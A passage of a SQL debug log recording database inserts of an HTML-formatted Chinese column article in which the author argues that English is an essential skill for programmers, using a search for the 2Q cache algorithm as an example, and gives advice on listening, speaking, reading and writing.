data-first-offset="true"><span data-slate-string="true">我记得在 2017 年的时候，就有一股讨论高考是不是应该取消英语的风潮，有不少反对者都说，英语学习了也用不上，可是直到现在，语文、数学和英语，这三门依然是高考中的公共科目。</span></span></span> 
</div> <div class="se-08118e65 " data-slate-type="paragraph" data-slate-object="block" data-key="2049"> 
<span data-slate-object="text" data-key="2050"><span data-slate-leaf="true" data-offset-key="2050:0" 
data-first-offset="true"><span data-slate-string="true">不知道你还记不记得高中化学课学的，使用氯酸钾在二氧化锰的催化下制氧气，软件技术的职业上升进程就像是氯酸钾分解的过程，而英语就像是软件技术进阶的催化剂，它自己单独未必能给你带来多大的价值，但是掌握了它的软件工程师，视野是完全不一样的。在这里我不想谈论英语学习是否具备一般必要性，但是对于程序员这个特殊的职业来说，我想来谈一谈它重要的原因。</span></span></span> 
</div> <h3 class="se-443713d9" data-slate-type="heading" data-slate-object="block" data-key="2051"><span 
data-slate-object="text" data-key="2052"><span data-slate-leaf="true" data-offset-key="2052:0" 
data-first-offset="true"><span data-slate-string="true">信息获取的最有力工具</span></span></span></h3> 
<div class="se-7d637e29 " data-slate-type="paragraph" data-slate-object="block" data-key="2053"> 
<span data-slate-object="text" data-key="2054"><span data-slate-leaf="true" data-offset-key="2054:0" 
data-first-offset="true"><span data-slate-string="true">其实最重要的原因说起来很简单，它并非是什么需要和世界人民沟通交流这样冠冕堂皇、牵强附会的理由，而是在于程序员这个职业的特殊性。</span></span></span> 
</div> <div class="se-71a97702 " data-slate-type="paragraph" data-slate-object="block" data-key="2055"> 
<span data-slate-object="text" data-key="2056"><span data-slate-leaf="true" data-offset-key="2056:0" 
data-first-offset="true"><span data-slate-string="true">程序员需要长期地学习，而大多数的学习材料，都是使用英文撰写的。特别是对于基于 
Web 的全栈工程师来说更是如此，全栈技术迭代很快，新的技术资料一般都是英文的，英文能力，尤其是英文的阅读能力会很大程度地影响知识获取的速度。</span></span></span> 
</div> <div class="se-e9c5784e " data-slate-type="paragraph" data-slate-object="block" data-key="2057"> 
<span data-slate-object="text" data-key="2058"><span data-slate-leaf="true" data-offset-key="2058:0" 
data-first-offset="true"><span data-slate-string="true">我随便举个例子。</span></span></span> </div> 
<div class="se-5dd73bf3 " data-slate-type="paragraph" data-slate-object="block" data-key="2059"> 
<span data-slate-object="text" data-key="2060"><span data-slate-leaf="true" data-offset-key="2060:0" 
data-first-offset="true"><span data-slate-string="true">本专栏在介绍缓存的 LRU 算法的时候描述了 LRU 的缺陷，而有一些算法设计出来的目的就是为了解决这个缺陷，2Q 
算法就是其中之一。</span></span></span> </div> <div class="se-022bf94b " data-slate-type="paragraph" 
data-slate-object="block" data-key="2061"> <span data-slate-object="text" data-key="2062"><span 
data-slate-leaf="true" data-offset-key="2062:0" data-first-offset="true"><span data-slate-string="true">如果你使用 
Google 搜索“2Q 算法”，你会看到类似这样的结果：</span></span></span> </div> <div class="se-814b3dc1" data-slate-type="image" 
data-slate-object="block" data-key="2063"> <img class="se-c27c6057" src="https://static001.geekbang.org/resource/image/0d/cc/0da2e7723662c6404f0e494fd20ea8cc.png"> 
</div> <div class="se-c8c85b68 " data-slate-type="paragraph" data-slate-object="block" data-key="2064"> 
<span data-slate-object="text" data-key="2065"><span data-slate-leaf="true" data-offset-key="2065:0" 
data-first-offset="true"><span data-slate-string="true">基本上结果的相关性不错，但是这 4 条最靠上的结果都无一例外地是一些个人学习和分享的博客，对于 
2Q 算法的笔记和理解。拿百度搜索，结果也类似，其中 CSDN 的网站权重要高一些，并且结果页的右边多了一个毫无关联性的搜索热点消息栏。</span></span></span> </div> 
<div class="se-c6e36e36 " data-slate-type="paragraph" data-slate-object="block" data-key="2066"> 
<span data-slate-object="text" data-key="2067"><span data-slate-leaf="true" data-offset-key="2067:0" 
data-first-offset="true"><span data-slate-string="true">但是，如果使用英文，搜索“2Q algorithm”，结果页如下：</span></span></span> 
</div> <div class="se-9c9b2afd" data-slate-type="image" data-slate-object="block" data-key="2068"> 
<img class="se-0db3a150" src="https://static001.geekbang.org/resource/image/01/57/016cd82a8023dcf10ff26a06fb36e857.png"> 
</div> <div class="se-00179e62 " data-slate-type="paragraph" data-slate-object="block" data-key="2069"> 
<span data-slate-object="text" data-key="2070"><span data-slate-leaf="true" data-offset-key="2070:0" 
data-first-offset="true"><span data-slate-string="true">也一样看看这 4 条最靠上的结果，相关性依然保持的同时，相对有更有价值的内容：</span></span></span> 
</div> <div class="se-5797fda5" data-slate-type="list" data-slate-object="block" data-key="2071"> 
<div class="se-28d81a4f se-1017f217" data-slate-type="list-line" data-slate-object="block" 
data-key="2072"> <span data-slate-object="text" data-key="2073"><span data-slate-leaf="true" 
data-offset-key="2073:0" data-first-offset="true"><span data-slate-string="true">第一条，是 2Q 算法提出的论文，这显然是对于该算法最权威的材料了，并且标题下面列出了引用数 
831，以及论文相关文章的链接；</span></span></span> </div> <div class="se-cbb720eb se-b94803f1" data-slate-type="list-line" 
data-slate-object="block" data-key="2074"> <span data-slate-object="text" data-key="2075"><span 
data-slate-leaf="true" data-offset-key="2075:0" data-first-offset="true"><span data-slate-string="true">第 
2 条是针对该算法的一个介绍和改进；</span></span></span> </div> <div class="se-05282614 se-400ea73a" data-slate-type="list-line" 
data-slate-object="block" data-key="2076"> <span data-slate-object="text" data-key="2077"><span 
data-slate-leaf="true" data-offset-key="2077:0" data-first-offset="true"><span data-slate-string="true">第 
3 条是 2Q 算法的讨论；</span></span></span> </div> <div class="se-e9105333 se-d72004b9" data-slate-type="list-line" 
data-slate-object="block" data-key="2078"> <span data-slate-object="text" data-key="2079"><span 
data-slate-leaf="true" data-offset-key="2079:0" data-first-offset="true"><span data-slate-string="true">而第 
4 条则是维基百科关于缓存替换策略的页面，2Q 算法就是被设计用作缓存替换算法的，这些算法被放在一起横向比较。</span></span></span> </div> </div> 
<div class="se-bdd87a38 " data-slate-type="paragraph" data-slate-object="block" data-key="2080"> 
<span data-slate-object="text" data-key="2081"><span data-slate-leaf="true" data-offset-key="2081:0" 
data-first-offset="true"><span data-slate-string="true">如果你进一步点击查看维基百科的这个缓存替换策略的页面，你依然可以发现，</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2082" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="2083"><span data-slate-leaf="true" data-offset-key="2083:0" 
data-first-offset="true"><span data-slate-string="true">英文页面</span></span></span></a><span 
data-slate-object="text" data-key="2084"><span data-slate-leaf="true" data-offset-key="2084:0" 
data-first-offset="true"><span data-slate-string="true">要远比</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2085" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="2086"><span data-slate-leaf="true" data-offset-key="2086:0" data-first-offset="true"><span 
data-slate-string="true">中文页面</span></span></span></a><span data-slate-object="text" data-key="2087"><span 
data-slate-leaf="true" data-offset-key="2087:0" data-first-offset="true"><span data-slate-string="true">内容丰富得多：</span></span></span> 
</div> <div class="se-f8e38454" data-slate-type="image" data-slate-object="block" data-key="2088"> 
<img class="se-bf828211" src="https://static001.geekbang.org/resource/image/1f/89/1fc3805b86eb3701a83d07edfb952889.png"> 
</div> <div class="se-cfb31eb7 " data-slate-type="paragraph" data-slate-object="block" data-key="2089"> 
<span data-slate-object="text" data-key="2090"><span data-slate-leaf="true" data-offset-key="2090:0" 
data-first-offset="true"><span data-slate-string="true">你看，英文页面中有这样一系列缓存替换算法的比较，每个算法都有具体说明；但是中文页呢，什么都没有，只有一个简单的介绍。</span></span></span> 
</div> <div class="se-998a2892" data-slate-type="image" data-slate-object="block" data-key="2091"> 
<img class="se-d43b3242" src="https://static001.geekbang.org/resource/image/a1/86/a1d514c8a0adaca8f61615fc91a0d386.png"> 
</div> <div class="se-8f971383 " data-slate-type="paragraph" data-slate-object="block" data-key="2092"> 
<span data-slate-object="text" data-key="2093"><span data-slate-leaf="true" data-offset-key="2093:0" 
data-first-offset="true"><span data-slate-string="true">需要强调的是，我不希望被误解，我的意思不是说不能使用中文搜索技术材料，通过这个实际的例子，我是想向你说明，在计算机科学领域，大多我们查询技术资料的时候，使用英文确确实实能带来多得多的好处。</span></span></span> 
</div> <div class="se-9249cbd9 " data-slate-type="paragraph" data-slate-object="block" data-key="2094"> 
<span data-slate-object="text" data-key="2095"><span data-slate-leaf="true" data-offset-key="2095:0" 
data-first-offset="true"><span data-slate-string="true">在这个领域里，</span></span></span><span data-slate-object="text" 
data-key="2096"><span data-slate-leaf="true" data-offset-key="2096:0" data-first-offset="true"><span 
class="se-62b3d43b" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">学会英文就多了一门获取信息的最佳工具，并且这个工具往往还远远不是别的工具能替代的。</span></span></span></span><span 
data-slate-object="text" data-key="2097"><span data-slate-leaf="true" data-offset-key="2097:0" 
data-first-offset="true"><span data-slate-string="true">在之前 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2098" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="2099"><span data-slate-leaf="true" data-offset-key="2099:0" data-first-offset="true"><span 
data-slate-string="true">[第 06 讲]</span></span></span></a><span data-slate-object="text" data-key="2100"><span 
data-slate-leaf="true" data-offset-key="2100:0" data-first-offset="true"><span data-slate-string="true"> 
的特别放送中，我曾经介绍过，如今互联网十大企业，中国占了 4 家，美国占了 6 家，因此如果能够掌握好中文和英文这两门语言，程序员在信息获取上的优势就显而易见了。</span></span></span> 
</div> <div class="se-12c98aa9 " data-slate-type="paragraph" data-slate-object="block" data-key="2101"> 
<span data-slate-object="text" data-key="2102"><span data-slate-leaf="true" data-offset-key="2102:0" 
data-first-offset="true"><span data-slate-string="true">随着我们的生活逐渐被微信朋友圈、微博这些社交媒体所“统治”，我们更要注意技术材料的权威性，以避免那些错误的、走样的信息，因此我们需要使用英语去寻找自己需要的资料，并且去官方、可信的渠道去寻找资料。特别是当你可以阅读两份材料，一份英文的原版材料，一份经过了翻译，你会觉得哪一份更可靠呢？</span></span></span> 
</div> <h3 class="se-fe0bd6d3" data-slate-type="heading" data-slate-object="block" data-key="2103"><span 
data-slate-object="text" data-key="2104"><span data-slate-leaf="true" data-offset-key="2104:0" 
data-first-offset="true"><span data-slate-string="true">给自己更多的可能性</span></span></span></h3> 
<div class="se-dd8cf624 " data-slate-type="paragraph" data-slate-object="block" data-key="2105"> 
<span data-slate-object="text" data-key="2106"><span data-slate-leaf="true" data-offset-key="2106:0" 
data-first-offset="true"><span data-slate-string="true">每过一阵子，互联网就会刮起一阵“无用论”的旋风，除了前面提到的“英语无用论”，还有曾经的“数学无用论”，提出这个说辞的人理由居然是因为“生活中用到的数学”只是买菜那点而已，生活中不需要微积分，不需要线性代数。</span></span></span> 
</div> <div class="se-ba08cdd7 " data-slate-type="paragraph" data-slate-object="block" data-key="2107"> 
<span data-slate-object="text" data-key="2108"><span data-slate-leaf="true" data-offset-key="2108:0" 
data-first-offset="true"><span data-slate-string="true">有人在回复中讽刺持有这些观点的人“只知道买菜”而已，其实，我倒认为这种观点有它“话糙理不糙”的部分，观点朴素，却是有一定道理的。事实上，倘若你回头看看你所学习的知识和掌握的技能，无论软硬，在你实际的工作中，能使用到的总归只有其中的一小部分。</span></span></span> 
</div> <div class="se-b5b09863 " data-slate-type="paragraph" data-slate-object="block" data-key="2109"> 
<span data-slate-object="text" data-key="2110"><span data-slate-leaf="true" data-offset-key="2110:0" 
data-first-offset="true"><span data-slate-string="true">然而，话要说回来，</span></span></span><span 
data-slate-object="text" data-key="2111"><span data-slate-leaf="true" data-offset-key="2111:0" 
data-first-offset="true"><span class="se-c2ed41bc" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">我们对大多数技能的学习，是为了给自己的未来带来更大可能性的。</span></span></span></span><span data-slate-object="text" 
data-key="2112"><span data-slate-leaf="true" data-offset-key="2112:0" data-first-offset="true"><span 
data-slate-string="true">就像软件领域的 Web 全栈技能一样，英语是一个更加广泛的带来更多可能性的技能。你可以参与到更大影响力的项目中去，你对雇主的选择会更加广阔，你可以在世界更多的地方游历。事实上，职业生涯经常会发生“无心插柳柳成荫”的飞跃，我们所做的学习和积累，就是让自己准备好，在机会到来的时候尽量不要失去。</span></span></span> 
</div> <h2 class="se-eb023694" data-slate-type="heading" data-slate-object="block" data-key="2113"><span 
data-slate-object="text" data-key="2114"><span data-slate-leaf="true" data-offset-key="2114:0" 
data-first-offset="true"><span data-slate-string="true">有哪些学习英语的策略？</span></span></span></h2> 
<div class="se-73f86737 " data-slate-type="paragraph" data-slate-object="block" data-key="2115"> 
<span data-slate-object="text" data-key="2116"><span data-slate-leaf="true" data-offset-key="2116:0" 
data-first-offset="true"><span data-slate-string="true">顺理成章地，从“为什么”到“怎么样”，接下来就该说说程序员学习英语的策略了。这些策略是从我的角度来描述的，坦诚地讲，我并不聪明，学习英语的过程也颇为坎坷，高考的时候英语是拖后腿的科目。</span></span></span> 
</div> <div class="se-42ac8c6d " data-slate-type="paragraph" data-slate-object="block" data-key="2117"> 
<span data-slate-object="text" data-key="2118"><span data-slate-leaf="true" data-offset-key="2118:0" 
data-first-offset="true"><span data-slate-string="true">我知道有些朋友英文基础很好，或者英文的学习能力很强，那么我估计就不需要我这些所谓的“经验”了，但是如果你和曾经的我一样，花过不少时间，可英语的学习效果还不好，那么你就可以听听我的介绍了。</span></span></span> 
</div> <div class="se-c748e789 " data-slate-type="paragraph" data-slate-object="block" data-key="2119"> 
<span data-slate-object="text" data-key="2120"><span data-slate-leaf="true" data-offset-key="2120:0" 
data-first-offset="true"><span data-slate-string="true">首先我想说的是，程序员总是希望英语学习的投资能够尽量得到高回报，因此一般情况下，</span></span></span><span 
data-slate-object="text" data-key="2121"><span data-slate-leaf="true" data-offset-key="2121:0" 
data-first-offset="true"><span class="se-6e49b0ad" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">我并不赞同所谓的“听说读写”均衡发展的观点。你能做到均衡发展当然好，但是事实往往是残酷的</span></span></span></span><span 
data-slate-object="text" data-key="2122"><span data-slate-leaf="true" data-offset-key="2122:0" 
data-first-offset="true"><span data-slate-string="true">，如果你还在学校里，那么还好，可是工作以后就不再如此了。也许生活每天都很忙碌，每天能抽出的时间并不多，更不可能像鸡汤文里说的那样，嘴里含一块小石头去海边练习发音。</span></span></span> 
</div> <h3 class="se-ea35e0c0" data-slate-type="heading" data-slate-object="block" data-key="2123"><span 
data-slate-object="text" data-key="2124"><span data-slate-leaf="true" data-offset-key="2124:0" 
data-first-offset="true"><span data-slate-string="true">听和读重于说和写</span></span></span></h3> 
<div class="se-835628a5 " data-slate-type="paragraph" data-slate-object="block" data-key="2125"> 
<span data-slate-object="text" data-key="2126"><span data-slate-leaf="true" data-offset-key="2126:0" 
data-first-offset="true"><span data-slate-string="true">英文的“说”和“写”往往并不容易练习，除了立志去英文环境发展的程序员以外，我建议你可以着重关注于“听”和“读”。众所周知语言的学习是需要长期强化的，有了如今便捷的互联网，英文文章、英文电影、英文新闻，只要自己愿意，我认为</span></span></span><span 
data-slate-object="text" data-key="2127"><span data-slate-leaf="true" data-offset-key="2127:0" 
data-first-offset="true"><span class="se-36342e28" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">“听”和“读”的不断刺激强化已经不成问题了，它们属于信息接收，但是“说”和“写”属于信息表达，后者更需要环境的浸染</span></span></span></span><span 
data-slate-object="text" data-key="2128"><span data-slate-leaf="true" data-offset-key="2128:0" 
data-first-offset="true"><span data-slate-string="true">，如果仅仅靠一周个把小时的英语角，发几封英文邮件，或者是只进行缺乏互动的练习，进步是很慢的。</span></span></span> 
</div> <div class="se-1038b72f " data-slate-type="paragraph" data-slate-object="block" data-key="2129"> 
<span data-slate-object="text" data-key="2130"><span data-slate-leaf="true" data-offset-key="2130:0" 
data-first-offset="true"><span data-slate-string="true">就我自己的经历而言，我在大学里面花费了大量的时间去学习英语的说和写，但其实效果并不好。那时候掌握的是语法和一点词汇基础，可以在思考以后说出、写出“正确”的句子，可以用来考试，但没法使用。</span></span></span> 
</div> <div class="se-044bad1b " data-slate-type="paragraph" data-slate-object="block" data-key="2131"> 
<span data-slate-object="text" data-key="2132"><span data-slate-leaf="true" data-offset-key="2132:0" 
data-first-offset="true"><span data-slate-string="true">这里有两个原因：一个是思维还是中文思维，说的时候需要思考，在大脑中还需要进行从中文到英文的翻译过程；另一个是表达的方式并不是实际的、常用的，而是自己生硬的翻译。因此英语实际应用的提高，基本上都是在工作以后，因为有了实际的需要，以及英语环境，慢慢就给拧到英文思维了，并且逐渐掌握了表达的惯用法和一些技巧，这些都和读书时候学得不一样。</span></span></span> 
</div> <h3 class="se-ba3c2ff3" data-slate-type="heading" data-slate-object="block" data-key="2133"><span 
data-slate-object="text" data-key="2134"><span data-slate-leaf="true" data-offset-key="2134:0" 
data-first-offset="true"><span data-slate-string="true">听：多样的口音</span></span></span></h3> <div 
class="se-655031e2 " data-slate-type="paragraph" data-slate-object="block" data-key="2135"> 
<span data-slate-object="text" data-key="2136"><span data-slate-leaf="true" data-offset-key="2136:0" 
data-first-offset="true"><span data-slate-string="true">我曾经有一个误解，以为英语的学习就要尽量去找那些 VOA、BBC 这样的纯正发音的材料，但实际上根本不用这样。无论是工作还是生活，我们接触的英文都是杂七杂八的，</span></span></span><span 
data-slate-object="text" data-key="2137"><span data-slate-leaf="true" data-offset-key="2137:0" 
data-first-offset="true"><span class="se-29eeaeac" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">各种各样的发音，各种各样的表达法。</span></span></span></span><span data-slate-object="text" 
data-key="2138"><span data-slate-leaf="true" data-offset-key="2138:0" data-first-offset="true"><span 
data-slate-string="true">通过对于不同口音听力的训练，能够让自己对于英语听和理解的能力得到提升。这就有点像打乒乓球，要和各种各样风格的人过招，有直板有横板，有攻有守，自己的功力才能提升。</span></span></span> 
</div> <h3 class="se-849defed" data-slate-type="heading" data-slate-object="block" data-key="2139"><span 
data-slate-object="text" data-key="2140"><span data-slate-leaf="true" data-offset-key="2140:0" 
data-first-offset="true"><span data-slate-string="true">说：关注内容，而不是发音和语法</span></span></span></h3> 
<div class="se-d0e1ae66 " data-slate-type="paragraph" data-slate-object="block" data-key="2141"> 
<span data-slate-object="text" data-key="2142"><span data-slate-leaf="true" data-offset-key="2142:0" 
data-first-offset="true"><span data-slate-string="true">上面一条是关于“听”的，这一条则是关于“说”。对于英语能力较初级的朋友来说，发音也好，语法也好，总是有很多的问题，而即便经过了再多的练习，口音和词句的用法往往还是会和“地道”有所区别。</span></span></span> 
</div> <div class="se-ddee4d09 " data-slate-type="paragraph" data-slate-object="block" data-key="2143"> 
<span data-slate-object="text" data-key="2144"><span data-slate-leaf="true" data-offset-key="2144:0" 
data-first-offset="true"><span data-slate-string="true">但是，这又有什么关系呢？平时的沟通，还是要把关注点放在内容上面。</span></span></span><span 
data-slate-object="text" data-key="2145"><span data-slate-leaf="true" data-offset-key="2145:0" 
data-first-offset="true"><span class="se-6585723b" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">无论语法有哪些错误，发音有哪些错误，实际上它们的重要性都远不如把“内容”表达出来高。</span></span></span></span><span 
data-slate-object="text" data-key="2146"><span data-slate-leaf="true" data-offset-key="2146:0" 
data-first-offset="true"><span data-slate-string="true">练习使用清晰、简洁的逻辑把问题描述清楚，真正达到沟通和交流的目的，日常工作生活中，不会有多少人在意你的发音。</span></span></span> 
</div> <h3 class="se-b5888a10" data-slate-type="heading" data-slate-object="block" data-key="2147"><span 
data-slate-object="text" data-key="2148"><span data-slate-leaf="true" data-offset-key="2148:0" 
data-first-offset="true"><span data-slate-string="true">读：从技术材料的检索和阅读开始</span></span></span></h3> 
<div class="se-108e610d " data-slate-type="paragraph" data-slate-object="block" data-key="2149"> 
<span data-slate-object="text" data-key="2150"><span data-slate-leaf="true" data-offset-key="2150:0" 
data-first-offset="true"><span data-slate-string="true">英语学习和技术学习，我们当然希望一举两得。我知道在开始的时候，这会比较困难，毕竟谁都有自己的舒适区。事实上，在写这个专栏的过程中，我本来找的扩展阅读材料绝大多数都是英文的，后来在编辑的建议下，才尽可能地把其中我能找得到类似质量和主题的材料换成中文的。</span></span></span> 
</div> <div class="se-92c0e000 " data-slate-type="paragraph" data-slate-object="block" data-key="2151"> 
<span data-slate-object="text" data-key="2152"><span data-slate-leaf="true" data-offset-key="2152:0" 
data-first-offset="true"><span data-slate-string="true">技术材料的阅读可以根据自己的情况循序渐进，但是在开始的时候，你要有个预期，就是阅读英文材料的速度肯定是要慢于中文材料的。作为程序员，我们也可以把自己的英文阅读目标范畴基本定在技术文档上面，从我的经历来看，技术上从中文逐渐适应到英文，还是要比生活上的切换简单得多得多。</span></span></span> 
</div> <h3 class="se-fa284431" data-slate-type="heading" data-slate-object="block" data-key="2153"><span 
data-slate-object="text" data-key="2154"><span data-slate-leaf="true" data-offset-key="2154:0" 
data-first-offset="true"><span data-slate-string="true">写：学习那些文档和邮件中的惯用法</span></span></span></h3> 
<div class="se-a0777fa1 " data-slate-type="paragraph" data-slate-object="block" data-key="2155"> 
<span data-slate-object="text" data-key="2156"><span data-slate-leaf="true" data-offset-key="2156:0" 
data-first-offset="true"><span data-slate-string="true">仅仅是靠自己写，没有反馈的话，你不会知道这样写对不对、好不好。很多常见的用法课本里不会写，老师未必教，你可能很明确自己的表达从语法上看是不是正确，但是大家却未必这样使用。因此阅读那些英语母语的程序员写的的技术文档，就是一个很好的积累惯用法的方法。而英文邮件，则是另一个很好的例子，阅读它们，可以积累一些书面上怎么表达的例子，怎么提问，怎么认可，怎么否定，怎么请求帮助，等等。</span></span></span> 
</div> <h3 class="se-ac9a342c" data-slate-type="heading" data-slate-object="block" data-key="2157"><span 
data-slate-object="text" data-key="2158"><span data-slate-leaf="true" data-offset-key="2158:0" 
data-first-offset="true"><span data-slate-string="true">寻找乐趣</span></span></span></h3> <div 
class="se-74809dfd " data-slate-type="paragraph" data-slate-object="block" data-key="2159"> 
<span data-slate-object="text" data-key="2160"><span data-slate-leaf="true" data-offset-key="2160:0" 
data-first-offset="true"><span data-slate-string="true">这是最后一点，也是最重要的一点。没有了乐趣，所有的学习都是事倍功半。最理想的状况，应该是乐于做一件事，做完了，还在不知不觉中获得了自己想要的东西。我知道有很多程序员朋友就是因为喜欢编程才逐渐走上了程序员这条路，郭德纲说过：“如果你的工作也是你的爱好，那是老天爷疼你。”英语学习也是如此，如果你在努力的过程中能得到更多的乐趣，那就是绝妙。</span></span></span> 
</div> <div class="se-cb9754d6 " data-slate-type="paragraph" data-slate-object="block" data-key="2161"> 
<span data-slate-object="text" data-key="2162"><span data-slate-leaf="true" data-offset-key="2162:0" 
data-first-offset="true"><span data-slate-string="true">拿我自己来说，有两个时期我自己明显感觉英文进步比较大。一个是在读高中的时候，我是《最终幻想》的游戏迷，《最终幻想 
VIII》巨长的对白文字，我当时硬是凭借一个文曲星把剧情啃下来了；另一个是工作以后，美剧《Friends》断断续续看了好几遍，从一开始看中文字幕，到后来看英文字幕，以及再后来大致可以脱离字幕……这其中，兴趣的功劳是第一位的。</span></span></span> 
</div> <div class="se-73502fa2 " data-slate-type="paragraph" data-slate-object="block" data-key="2163"> 
<span data-slate-object="text" data-key="2164"><span data-slate-leaf="true" data-offset-key="2164:0" 
data-first-offset="true"><span data-slate-string="true">好，今天的特别放送就聊到这里。这是我的体会和分享，现在我把话筒给你，不如你也说说你的故事？</span></span></span> 
</div> <div class="se-ee122f50" data-slate-type="image" data-slate-object="block" data-key="2165"> 
<img class="se-ce0a560f" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 13, 13) 
 {executed in 0 msec}
2020-11-19 11:07:09.877 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_0_, nodebodyen0_.body_value as body_val2_3_0_, 
nodebodyen0_.body_summary as body_sum3_3_0_, nodebodyen0_.bundle as bundle4_3_0_, nodebodyen0_.delta 
as delta5_3_0_, nodebodyen0_.body_format as body_for6_3_0_, nodebodyen0_.langcode as langcode7_3_0_, 
nodebodyen0_.revision_id as revision8_3_0_ from node__body nodebodyen0_ where nodebodyen0_.entity_id=13 
 {executed in 0 msec}
2020-11-19 11:07:09.878 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:07:09.881 INFO  jdbc.sqltiming Line:373 - insert into node__body (body_value, body_summary, bundle, delta, body_format, langcode, revision_id, 
entity_id) values ('<div data-slate-editor="true" data-key="2035" autocorrect="off" spellcheck="false" 
data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: break-word;"> 
<div class="se-268562ad " data-slate-type="paragraph" data-slate-object="block" data-key="2036"> 
<span data-slate-object="text" data-key="2037"><span data-slate-leaf="true" data-offset-key="2037:0" 
data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> </div> 
<div class="se-082b6d4d " data-slate-type="paragraph" data-slate-object="block" data-key="2038"> 
<span data-slate-object="text" data-key="2039"><span data-slate-leaf="true" data-offset-key="2039:0" 
data-first-offset="true"><span data-slate-string="true">又到了相对轻松的特别放送时间，这一次，我想聊一聊程序员对于英语的学习。我在专栏最开始的 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="2040" class="se-d795ea91 
se-eb2c7cbb"><span data-slate-object="text" data-key="2041"><span data-slate-leaf="true" data-offset-key="2041:0" 
data-first-offset="true"><span data-slate-string="true">[学习路径]</span></span></span></a><span 
data-slate-object="text" data-key="2042"><span data-slate-leaf="true" data-offset-key="2042:0" 
data-first-offset="true"><span data-slate-string="true"> 中就提到了工程师的一些“基础”能力，比如数据结构和算法，当然也包括英语。当时我说，</span></span></span><span 
data-slate-object="text" data-key="2043"><span data-slate-leaf="true" data-offset-key="2043:0" 
data-first-offset="true"><span class="se-576941d3" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">对于进阶的工程师来说，英文能力是突破天花板的一个必选项</span></span></span></span><span data-slate-object="text" 
data-key="2044"><span data-slate-leaf="true" data-offset-key="2044:0" data-first-offset="true"><span 
data-slate-string="true">，而且英文是所有进阶的软件工程师应当强化的能力，对全栈工程师来说更甚。但是我在当时并没有展开论述，为什么在中文技术材料如此丰富的今天，在工作环境是以中文为主的情况下，英语的学习依然那么重要。</span></span></span> 
</div> <h2 class="se-fecf2dc4" data-slate-type="heading" data-slate-object="block" data-key="2045"><span 
data-slate-object="text" data-key="2046"><span data-slate-leaf="true" data-offset-key="2046:0" 
data-first-offset="true"><span data-slate-string="true">为什么英语是必选项？</span></span></span></h2> 
<div class="se-9d489007 " data-slate-type="paragraph" data-slate-object="block" data-key="2047"> 
<span data-slate-object="text" data-key="2048"><span data-slate-leaf="true" data-offset-key="2048:0" 
data-first-offset="true"><span data-slate-string="true">我记得在 2017 年的时候，就有一股讨论高考是不是应该取消英语的风潮，有不少反对者都说，英语学习了也用不上，可是直到现在，语文、数学和英语，这三门依然是高考中的公共科目。</span></span></span> 
</div> <div class="se-08118e65 " data-slate-type="paragraph" data-slate-object="block" data-key="2049"> 
<span data-slate-object="text" data-key="2050"><span data-slate-leaf="true" data-offset-key="2050:0" 
data-first-offset="true"><span data-slate-string="true">不知道你还记不记得高中化学课学的，使用氯酸钾在二氧化锰的催化下制氧气，软件技术的职业上升进程就像是氯酸钾分解的过程，而英语就像是软件技术进阶的催化剂，它自己单独未必能给你带来多大的价值，但是掌握了它的软件工程师，视野是完全不一样的。在这里我不想谈论英语学习是否具备一般必要性，但是对于程序员这个特殊的职业来说，我想来谈一谈它重要的原因。</span></span></span> 
</div> <h3 class="se-443713d9" data-slate-type="heading" data-slate-object="block" data-key="2051"><span 
data-slate-object="text" data-key="2052"><span data-slate-leaf="true" data-offset-key="2052:0" 
data-first-offset="true"><span data-slate-string="true">信息获取的最有力工具</span></span></span></h3> 
<div class="se-7d637e29 " data-slate-type="paragraph" data-slate-object="block" data-key="2053"> 
<span data-slate-object="text" data-key="2054"><span data-slate-leaf="true" data-offset-key="2054:0" 
data-first-offset="true"><span data-slate-string="true">其实最重要的原因说起来很简单，它并非是什么需要和世界人民沟通交流这样冠冕堂皇、牵强附会的理由，而是在于程序员这个职业的特殊性。</span></span></span> 
</div> <div class="se-71a97702 " data-slate-type="paragraph" data-slate-object="block" data-key="2055"> 
<span data-slate-object="text" data-key="2056"><span data-slate-leaf="true" data-offset-key="2056:0" 
data-first-offset="true"><span data-slate-string="true">程序员需要长期地学习，而大多数的学习材料，都是使用英文撰写的。特别是对于基于 
Web 的全栈工程师来说更是如此，全栈技术迭代很快，新的技术资料一般都是英文的，英文能力，尤其是英文的阅读能力会很大程度地影响知识获取的速度。</span></span></span> 
</div> <div class="se-e9c5784e " data-slate-type="paragraph" data-slate-object="block" data-key="2057"> 
<span data-slate-object="text" data-key="2058"><span data-slate-leaf="true" data-offset-key="2058:0" 
data-first-offset="true"><span data-slate-string="true">我随便举个例子。</span></span></span> </div> 
<div class="se-5dd73bf3 " data-slate-type="paragraph" data-slate-object="block" data-key="2059"> 
<span data-slate-object="text" data-key="2060"><span data-slate-leaf="true" data-offset-key="2060:0" 
data-first-offset="true"><span data-slate-string="true">本专栏在介绍缓存的 LRU 算法的时候描述了 LRU 的缺陷，而有一些算法设计出来的目的就是为了解决这个缺陷，2Q 
算法就是其中之一。</span></span></span> </div> <div class="se-022bf94b " data-slate-type="paragraph" 
data-slate-object="block" data-key="2061"> <span data-slate-object="text" data-key="2062"><span 
